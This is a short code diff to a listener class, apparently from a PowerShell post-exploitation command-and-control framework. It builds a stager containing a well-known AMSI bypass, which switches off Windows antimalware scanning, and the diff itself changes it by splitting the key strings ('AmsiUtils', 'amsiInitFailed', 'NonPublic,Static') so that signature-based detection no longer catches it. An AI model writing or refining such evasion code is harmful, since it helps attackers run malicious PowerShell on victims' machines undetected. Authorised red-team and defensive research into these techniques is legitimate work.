@@ -133,9 +133,9 @@ class Listener:
 
                     # @mattifestation's AMSI bypass
                     stager += helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.AmsiUtils'"
+                    stager += "'System.Management.Automation.Ams'+'iUtils'"
                     stager += helpers.randomize_capitalization(');$Ref.GetField(')
-                    stager += "'amsiInitFailed','NonPublic,Static'"
+                    stager += "'am'+'siInitFailed','NonPu'+'blic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,$true);")
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
